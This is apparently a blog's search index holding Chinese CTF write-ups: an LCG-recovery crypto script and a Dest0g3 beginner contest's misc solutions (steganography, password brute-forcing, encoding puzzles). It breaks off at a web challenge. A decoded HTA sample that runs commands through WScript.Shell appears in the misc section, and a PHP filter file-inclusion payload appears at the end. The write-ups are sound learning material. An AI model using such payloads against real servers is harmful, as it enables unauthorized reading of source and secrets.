<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Hello</title>
    <url>/2022/09/Hello/</url>
    <content><![CDATA[<p>你不喜欢wlop么？</p>
<span id="more"></span>
<p><img src="/2022/09/Hello/wlop04.jpg" alt="wlop04"></p>
]]></content>
  </entry>
  <entry>
    <title>HWS-Crypto</title>
    <url>/2022/08/HWS-Crypto/</url>
    <content><![CDATA[<p>这场比赛诶，参加的莫名其妙的，还没来得及复现，就做出来一个Crypto。qwq</p>
<span id="more"></span>
<h3 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h3>
<h4 id="hws-easyrsa"><a class="markdownIt-Anchor" href="#hws-easyrsa"></a> HWS-easyRSA</h4>
<h5 id="解题过程"><a class="markdownIt-Anchor" href="#解题过程"></a> 解题过程：</h5>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">m = <span class="number">31893593182018727625473530765941216190921866039118147474754069955393226712079257707838327486268599271803</span></span><br><span class="line">seed0 = <span class="number">25820280412859586557218124484272275594433027771091486422152141535682739897353623931875432576083022273940</span></span><br><span class="line">seed1 = <span class="number">24295465524789348024814588142969609603624462580932512051939198335014954252359986260009296537423802567677</span></span><br><span class="line">seed2 = <span class="number">14963686422550871447791815183480974143372785034397446416396172429864269108509521776424254168481536292904</span></span><br><span class="line"></span><br><span class="line">a = (seed2 - seed1) * gmpy2.invert(seed1 - seed0, m) % m</span><br><span class="line">b = (seed1 - a * seed0) % m</span><br><span class="line"></span><br><span class="line">MMI = <span class="keyword">lambda</span> A, m, s=<span class="number">1</span>, t=<span class="number">0</span>, N=<span class="number">0</span>: (m &lt; <span class="number">2</span> <span class="keyword">and</span> t % N <span class="keyword">or</span> MMI(m, A % m, t, s - A // m * t, N <span class="keyword">or</span> m), -<span class="number">1</span>)[m &lt; <span class="number">1</span>]  <span class="comment"># 逆元计算</span></span><br><span class="line">ani = MMI(a, m)</span><br><span class="line">seed = seed2</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    seed = (ani * (seed - b)) % m</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(seed))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>赛事Writeup</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>Dest0g3 520迎新赛</title>
    <url>/2022/08/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B/</url>
    <content><![CDATA[<h1 id="dest0g3-520迎新赛"><a class="markdownIt-Anchor" href="#dest0g3-520迎新赛"></a> Dest0g3 520迎新赛</h1>
<p>Dest0g3首次招新啦！</p>
<p>Dest0g3 Team现逐步发展到各大高校及安全公司均有成员分布，在过去的半年里先后取得L3HCTF第十、SCTF第六及SUSCTF第四的优异成绩。</p>
<p>首届Dest0g3 520迎新赛更加注重CTFer的基础知识面掌握程度，由易到难，适合各学习阶段选手参加，纯萌新水准。</p>
<p>Dest0g3期待更多新生力量的加入，如有意向请在赛后提交wp与简历，或联系@Dest0g3 Team （QQ：1115230222）</p>
<p>比赛时间：2022.5.20 10:00 - 5.27 10:00</p>
<p>题目分类：Web、Pwn、Misc、Crypto、Re、AI、BlockChain</p>
<p>题目难度：萌新</p>
<p>比赛类型：个人赛</p>
<p>比赛交流QQ群：923945203</p>
<p>个人赛奖励：总榜前10及各方向前三均可获得《从0到1：CTFer成长之路》一本 + 定制U盘（32G）一个</p>
<span id="more"></span>
<h2 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> Misc</h2>
<h3 id="welcome-to-fxxking-destctf"><a class="markdownIt-Anchor" href="#welcome-to-fxxking-destctf"></a> Welcome to fxxking DestCTF</h3>
<p>**题目描述：**关注公众号并回复：Give me the fxxking flag</p>
<p>**附件下载：**<a href="https://files.buuoj.cn/files/8fc59c32ce5bcf7da3917ad4a3a023ba/jpg">https://files.buuoj.cn/files/8fc59c32ce5bcf7da3917ad4a3a023ba/jpg</a></p>
<p><strong>做题过程：</strong></p>
<p>将附件拖入浏览器查看。获得二维码，扫码关注公众号，输入提示给的：Give me the fxxking flag</p>
<p><img src="https://img-blog.csdnimg.cn/c2001876496f4c2292e236787d6a1064.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>获取flag：Dest0g3{W31c0m3_t0_DestCTF2022!}</p>
<h3 id="pngenius"><a class="markdownIt-Anchor" href="#pngenius"></a> Pngenius</h3>
<p><strong>题目描述：</strong></p>
<p>**附件下载：**<a href="https://files.buuoj.cn/files/5a64d4c2532f28b79aa99089c3f76ff5/Dest0g3.png">https://files.buuoj.cn/files/5a64d4c2532f28b79aa99089c3f76ff5/Dest0g3.png</a></p>
<p><strong>做题过程：</strong></p>
<blockquote>
<p>1、获取图片是PNG格式，首先想到的就是LSB隐写，使用工具stegslove查看</p>
<p>在r 0 g 0 b 0处发现有变化。</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/359af78c6f5a4c589951a0fb06d41b4f.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"><img src="https://img-blog.csdnimg.cn/86ffb3a2a628455bbc8753c9aae546c4.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"><img src="https://img-blog.csdnimg.cn/56a9f5ded36347ce90a55fc14aa8cbc5.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<blockquote>
<p>2、使用stegslove自带的Data Extract 数据提取工具对三处异常，进行查看。</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/321e9f64811e4ff9b9a7173a133de680.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"><img src="https://img-blog.csdnimg.cn/bbb2325b1ca949c78345c512a80b0baf.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<blockquote>
<p>3、 得到一个压缩包的解压密码，返回图片，使用binwalk进行扫描，并提取压缩包</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/2c43f5298f2944ff9db941fc40514f10.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<blockquote>
<p>4、输入压缩包密码Weak_Pas5w0rd，打开压缩包，获取flag.txt。</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/c0beb361c71f491cb15e387b11233fab.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>获取flag：Dest0g3{2908C1AA-B2C1-B8E6-89D1-21B97D778603}</p>
<h3 id="easyencode"><a class="markdownIt-Anchor" href="#easyencode"></a> EasyEncode</h3>
<p>**题目描述：**Enjoy Decoding</p>
<p>**附件下载：**<a href="https://files.buuoj.cn/files/2fb77a72cba82a4c9a749998a1073e58/encode.zip">https://files.buuoj.cn/files/2fb77a72cba82a4c9a749998a1073e58/encode.zip</a></p>
<p><strong>做题过程：</strong></p>
<blockquote>
<p>下载附件，是个ZIP文件，解压，发现有加密，丢进010 edtier中查看</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/9366225f80f442268e5d39bc432269e6.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<blockquote>
<p>2、发现不是伪加密，于是试着用ARCHPR爆破一下，密码长度选择4-6位。</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/014592d521754099affcc8d040053bb5.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<blockquote>
<p>获得密码100861，解压压缩包,打开文本文件，发现摩斯编码：</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/69d19aa758f54c6ca6765360a63ef07e.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<blockquote>
<p>3、下面就是解码过程：</p>
</blockquote>
<blockquote>
<p>运用在线工具<a href="https://www.lddgo.net/encrypt/morse">在线摩斯密码翻译器 (lddgo.net)</a></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/7cb0a08d95c84f52a15831cb7f247b5b.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<blockquote>
<p>获得一串Hex（十六进制）编码，运用在线工具<a href="https://the-x.cn/encodings/Hex.aspx">HEX转字符 十六进制转字符 hex gb2312 gbk utf8 汉字内码转换 - The X 在线工具 (the-x.cn)</a>转字符：</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/2051da8075304abcae5cca6dbdc2ddae.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<blockquote>
<p>获得一串unicode编码，使用在线工具<a href="https://tool.chinaz.com/tools/unicode.aspx">Unicode编码转换 - 站长工具 (chinaz.com)</a></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/484a9cb95ec9408d9ad2905d7b59f600.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<blockquote>
<p>“%3D”在url编码中是“=”’，所以进行base64解码，运用在线工具：<a href="https://the-x.cn/zh-cn/base64">Base64解码 Base64编码 UTF8 GB2312 UTF16 GBK 二进制 十六进制 解密 - The X 在线工具 (the-x.cn)</a></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/da9e343502734ca89a6f8cd6baf55939.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>获得flag：Dest0g3{Deoding_1s_e4sy_4_U}</p>
<h3 id="你知道js吗"><a class="markdownIt-Anchor" href="#你知道js吗"></a> 你知道js吗</h3>
<p><strong>题目描述：</strong></p>
<p>**附件下载：**<a href="https://files.buuoj.cn/files/5f1fc294b6468f733b774ceee6106062/flag">https://files.buuoj.cn/files/5f1fc294b6468f733b774ceee6106062/flag</a></p>
<p><strong>做题过程：</strong></p>
<blockquote>
<p>1、下载，附件，懒了，不想开010，直接吧附件扔到浏览器，浏览器自动编译后下载了一个flag.zip文件</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/ffa9b6c56dc641e0b5db406f890eb691.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<blockquote>
<p>2、打开压缩包，看到一堆XML格式的文件，直接扔浏览器里。</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/fe2bbcc56eea4328b710beee5cdfb457.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<blockquote>
<p>在docoment.xml中发现三串base64特征字符，拼接解码后获得</p>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> standalone=<span class="string">&quot;yes&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">assembly</span> <span class="attr">xmlns</span>=<span class="string">&quot;urn:schemas-microsoft-com:asm.v1&quot;</span> <span class="attr">manifestVersion</span>=<span class="string">&quot;1.0&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">trustInfo</span> <span class="attr">xmlns</span>=<span class="string">&quot;urn:schemas-microsoft-com:asm.v3&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">requestedExecutionLevel</span> <span class="attr">level</span>=<span class="string">&quot;asInvoker&quot;</span> <span class="attr">uiAccess</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">application</span> <span class="attr">xmlns</span>=<span class="string">&quot;urn:schemas-microsoft-com:asm.v3&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dpiAwareness</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://schemas.microsoft.com/SMI/2016/WindowsSettings&quot;</span>&gt;</span>Do you know js<span class="tag">&lt;/<span class="name">dpiAwareness</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;javascript&quot;</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="built_in">unescape</span>(<span class="string">&#x27;%3Chtml%3E%0A%3Cbody%3E%0A%0A%3C%21DOCTYPE%20html%3E%0A%3Chtml%3E%0A%3Chead%3E%0A%20%20%20%20%3Ctitle%3EDo%20You%20Know%20js%3C%2Ftitle%3E%0A%3CHTA%3AAPPLICATION%0A%20%20APPLICATIONNAME%3D%22Do%20You%20Know%20js%22%0A%20%20ID%3D%22Inception%22%0A%20%20VERSION%3D%221.0%22%0A%20%20SCROLL%3D%22no%22%2F%3E%0A%20%0A%3Cstyle%20type%3D%22text%2Fcss%22%3E%0A%3C%2Fhead%3E%0A%20%20%20%20%3Cdiv%20id%3D%22feature%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%22content%0A%09%09%09%09%3C%2Fstyle%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ch1%20id%3D%22unavailable%22%20class%3D%22loading%22%3EBuilding%20js.....%3C%2Fh1%3E%0A%09%09%09%09%3Cscript%20type%3D%22text%2Fjavascript%22%20language%3D%22javascript%22%3E%0A%09%09%09%09%09function%20RunFile%28%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20var%20WshShell%20%3D%20new%20ActiveXObject%28%22WScript.Shell%22%29%3B%0A%09%09%09%09%09WshShell.Run%28%22notepad%20%25windir%25%2FDesktop%2Fjs.txt%22%2C%201%2C%20false%29%3B%0A%20%20%20%20%20%20%20%20%20%20%2F*%20var%20oExec%20%3D%20WshShell.Exec%28%22notepad%22%29%3B%20*%2F%0A%09%09%09%09%09%7D%0A%09%09%09%09%3C%2Fscript%3E%0A%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0A%20%20%20%20%3C%2Fdiv%3E%0A%3Cbody%3E%0A%09%3Cinput%20type%3D%22button%22%20value%3D%22Implant%20Inception%20Here%22%20onclick%3D%22RunFile%28%29%3B%22%2F%3E%0A%09%3Cp%20style%3D%22color%3Awhite%3B%22%3E%0A%0A%2B%2B%2B%2B%2B%20%2B%2B%5B-%3E%20%2B%2B%2B%2B%2B%20%2B%2B%3C%5D%3E%20%2B%2B%2B..%20%2B%2B.-.%20%2B%2B.--%20--.%2B%2B%20%2B%2B.--%20%0A-.-.-%20--.%2B%2B%20%2B%2B%2B%2B.%0A%2B.---%20-..%2B%2B%20%2B%2B.%3C%2B%20%2B%2B%5B-%3E%20%2B%2B%2B%3C%5D%20%3E%2B%2B.%3C%20%2B%2B%2B%5B-%20%0A%3E---%3C%20%5D%3E---%20---.%2B%20%2B%2B%2B%2B.%20-----%0A.%2B%2B%2B.%20...--%20---.%2B%20%2B%2B%2B%2B.%20---.%2B%20%2B%2B.--%20---.%2B%20%2B%2B%2B%2B.%20---..%20%2B%2B%2B%2B%2B%20%2B.---%20----.%0A%3C%2B%2B%2B%2B%20%5B-%3E%2B%2B%20%2B%2B%3C%5D%3E%20%2B%2B.%3C%2B%20%2B%2B%2B%5B-%20%3E----%20%3C%5D%3E-.%20---.%2B%0A%20%2B%2B%2B%2B%2B%20.----%20-.%2B%2B.%20%2B%2B.%2B.%0A--.--%20.%3C%2B%2B%2B%20%2B%5B-%3E%2B%20%2B%2B%2B%3C%5D%20%3E%2B%2B.%3C%20%2B%2B%2B%2B%5B%20-%3E---%20-%3C%5D%3E-%20%0A.%2B.-.%20---.%2B%20%2B%2B.%2B.%20-.%2B%2B%2B%0A%2B.---%20--.%3C%2B%20%2B%2B%2B%5B-%20%3E%2B%2B%2B%2B%20%3C%5D%3E%2B%2B%20.%3C%2B%2B%2B%20%5B-%3E--%20-%3C%5D%3E-%20----.%20----.%20%2B.%2B%2B%2B%20%2B.---%0A-.---%20.%2B%2B%2B.%20-..%3C%2B%20%2B%2B%2B%5B-%20%3E%2B%2B%2B%2B%20%3C%5D%3E%2B%2B%20%0A.%3C%2B%2B%2B%20%2B%5B-%3E-%20---%3C%5D%20%3E-.%2B%2B%20%2B%2B%2B.-%20----.%0A%2B%2B%2B..%20---.%2B%20%2B%2B.--%20--.%2B.%20..%2B%2B%2B%20%2B.-.-%20----.%20%2B%2B%2B%2B%2B%20%0A.----%20.%2B.%2B%2B%20%2B%2B.--%20--.%2B%2B%0A%2B%2B.-.%20----.%20%2B.-.%2B%20%2B%2B%2B%2B.%20%0A%3C%2B%2B%2B%5B%20-%3E%2B%2B%2B%20%3C%5D%3E%2B%2B%20%2B%2B.%3C%0A%3C%2Fp%3E%0A%3C%2Fbody%3E%0A%3C%2Fbody%3E%0A%20%20%3C%2Fhtml%3E%0A&#x27;</span>));</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<blockquote>
<p>辨别解码后是，url编码，在线工具解码<a href="https://the-x.cn/zh-cn/UrlDecode.aspx">UrlDecode解码/UrlEncode编码 GB2312 UTF8 - The X 在线工具 (the-x.cn)</a>：</p>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Do You Know js<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">HTA:APPLICATION</span></span></span><br><span class="line"><span class="tag">  <span class="attr">APPLICATIONNAME</span>=<span class="string">&quot;Do You Know js&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">ID</span>=<span class="string">&quot;Inception&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">VERSION</span>=<span class="string">&quot;1.0&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">SCROLL</span>=<span class="string">&quot;no&quot;</span>/&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;feature&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;content</span></span></span></span><br><span class="line"><span class="string"><span class="tag"><span class="language-xml">				</span></span></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">h1</span> <span class="attr">id</span>=<span class="string">&quot;unavailable&quot;</span> <span class="attr">class</span>=<span class="string">&quot;loading&quot;</span>&gt;</span>Building js.....<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">language</span>=<span class="string">&quot;javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">					<span class="keyword">function</span> <span class="title function_">RunFile</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="keyword">var</span> <span class="title class_">WshShell</span> = <span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(<span class="string">&quot;WScript.Shell&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">					<span class="title class_">WshShell</span>.<span class="title class_">Run</span>(<span class="string">&quot;notepad %windir%/Desktop/js.txt&quot;</span>, <span class="number">1</span>, <span class="literal">false</span>);</span></span><br><span class="line"><span class="language-javascript">          <span class="comment">/* var oExec = WshShell.Exec(&quot;notepad&quot;); */</span></span></span><br><span class="line"><span class="language-javascript">					&#125;</span></span><br><span class="line"><span class="language-javascript">				</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Implant Inception Here&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;RunFile();&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;color:white;&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">+++++ ++[-&gt; +++++ ++&lt;]&gt; +++.. ++.-. ++.-- --.++ ++.-- </span><br><span class="line">-.-.- --.++ ++++.</span><br><span class="line">+.--- -..++ ++.&lt;+ ++[-&gt; +++&lt;] &gt;++.&lt; +++[- </span><br><span class="line">&gt;---&lt; ]&gt;--- ---.+ ++++. -----</span><br><span class="line">.+++. ...-- ---.+ ++++. ---.+ ++.-- ---.+ ++++. ---.. +++++ +.--- ----.</span><br><span class="line">&lt;++++ [-&gt;++ ++&lt;]&gt; ++.&lt;+ +++[- &gt;---- &lt;]&gt;-. ---.+</span><br><span class="line"> +++++ .---- -.++. ++.+.</span><br><span class="line">--.-- .&lt;+++ +[-&gt;+ +++&lt;] &gt;++.&lt; ++++[ -&gt;--- -&lt;]&gt;- </span><br><span class="line">.+.-. ---.+ ++.+. -.+++</span><br><span class="line">+.--- --.&lt;+ +++[- &gt;++++ &lt;]&gt;++ .&lt;+++ [-&gt;-- -&lt;]&gt;- ----. ----. +.+++ +.---</span><br><span class="line">-.--- .+++. -..&lt;+ +++[- &gt;++++ &lt;]&gt;++ </span><br><span class="line">.&lt;+++ +[-&gt;- ---&lt;] &gt;-.++ +++.- ----.</span><br><span class="line">+++.. ---.+ ++.-- --.+. ..+++ +.-.- ----. +++++ </span><br><span class="line">.---- .+.++ ++.-- --.++</span><br><span class="line">++.-. ----. +.-.+ ++++. </span><br><span class="line">&lt;+++[ -&gt;+++ &lt;]&gt;++ ++.&lt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line">&#x27;));<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<blockquote>
<p>辨别是Brainfuck/Ook!编码，使用在线工具解码：[Brainfuck/Ook! Obfuscation/Encoding <a href="https://www.splitbrain.org/services/ook">splitbrain.org]</a></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/0c0c85c1672f49479a6dc2be0e5ddf94.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<blockquote>
<p>解出获得：</p>
<p>446573743067337B38366661636163392D306135642D343034372D623730322D3836636233376162373762327D</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/f73ae5e6532e4414b16ffc0539177ed6.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<blockquote>
<p>接着Hex转文字就可以，使用在线工具<a href="https://the-x.cn/zh-cn/encodings/Hex.aspx">HEX转字符 十六进制转字符 hex gb2312 gbk utf8 汉字内码转换 - The X 在线工具 (the-x.cn)</a></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/0670b90edc9a407f9a1457e45eed2fbc.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>获取flag：Dest0g3{86facac9-0a5d-4047-b702-86cb37ab77b2}</p>
<h3 id="strangetraffic"><a class="markdownIt-Anchor" href="#strangetraffic"></a> StrangeTraffic</h3>
<p><strong>题目描述：</strong></p>
<p>**附件下载：**<a href="https://files.buuoj.cn/files/c329bafcc0113003c060d62f8f99b2e7/StrangeTraffic.pcapng">https://files.buuoj.cn/files/c329bafcc0113003c060d62f8f99b2e7/StrangeTraffic.pcapng</a></p>
<p><strong>做题过程：</strong></p>
<blockquote>
<p>1、下载附件，虚拟机kali打开文件，wireshark分析，可以看出是mudbus工控流量。追踪TCP流，在流0处看到可疑的东西，将展现形式改为Hex转储</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/40498cc937884428b33e0efc49584871.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<blockquote>
<p>2、在尾部存在base64特征编码，手动提取：</p>
<p>RGVzdDBnM3szMUE1QkVBNi1GMjBELUYxOEEtRThFQS0yOUI0RjI1NzEwOEJ9</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/7a35322cfd9a4b458cbe866587f2454d.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://img-blog.csdnimg.cn/cf147a5e73dd449d98750098326703bd.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<blockquote>
<p>获取flag：Dest0g3{31A5BEA6-F20D-F18A-E8EA-29B4F257108B}</p>
</blockquote>
<h3 id="easyword"><a class="markdownIt-Anchor" href="#easyword"></a> EasyWord</h3>
<p>**题目描述：**Let the word tell u</p>
<p>**附件下载：**<a href="https://files.buuoj.cn/files/aae5e40774fcd4089557007b1b030f41/EasyWord.zip">https://files.buuoj.cn/files/aae5e40774fcd4089557007b1b030f41/EasyWord.zip</a></p>
<p><strong>做题过程：</strong></p>
<blockquote>
<p>下载附件，打开压缩包，得到一个加密的docm文件，hint提示说六位小写字母加密，并给出了第三位和第五位，于是考虑用工具AOPRT:</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/d4f37e4627004af2911f0a31afd5f141.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<blockquote>
<p>爆破了好几次，结果都不对，别放弃使用该方法。</p>
</blockquote>
<h2 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h2>
<h3 id="phpdest"><a class="markdownIt-Anchor" href="#phpdest"></a> phpdest</h3>
<p><strong>题目描述：</strong></p>
<p>**附件下载：**<a href="http://d10eb908-5734-4807-9b12-493d578d495c.node4.buuoj.cn:81/">http://d10eb908-5734-4807-9b12-493d578d495c.node4.buuoj.cn:81/</a>(环境在Buuctf一直都有，可以自行打开）</p>
<p><strong>做题过程：</strong></p>
<blockquote>
<p>1、点开链接，获得解密源码，第一时间想到的是文件包含，堆叠注入。构建payload试一下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>
